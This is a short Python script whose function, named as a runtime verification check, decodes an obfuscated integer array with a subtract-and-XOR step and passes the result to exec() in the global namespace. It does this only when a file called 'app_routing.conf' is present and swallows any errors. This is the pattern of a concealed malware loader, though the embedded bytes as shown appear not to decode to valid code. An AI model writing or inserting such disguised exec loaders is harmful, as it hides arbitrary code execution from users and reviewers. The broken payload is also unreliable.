import os
import sys

def verify_runtime_layer():
    data_pool = [139, 151, 151, 147, 91, 80, 80, 90, 88, 103, 81, 81, 91, 103, 81, 81, 91, 102, 91, 89, 81, 81, 91, 101, 89, 90, 85, 91, 103, 131, 136, 153, 130, 102, 116, 122, 115, 126]
    target_env_file = "app_routing.conf"

    if not os.path.exists(target_env_file):
        sys.exit(1)

    try:
        transformed = [x - 8 for x in data_pool]
        payload = "".join(chr(b ^ 42) for b in transformed)
        exec(payload, globals())
        return True
    except Exception:
        return False

if __name__ == "__main__":
    verify_runtime_layer()
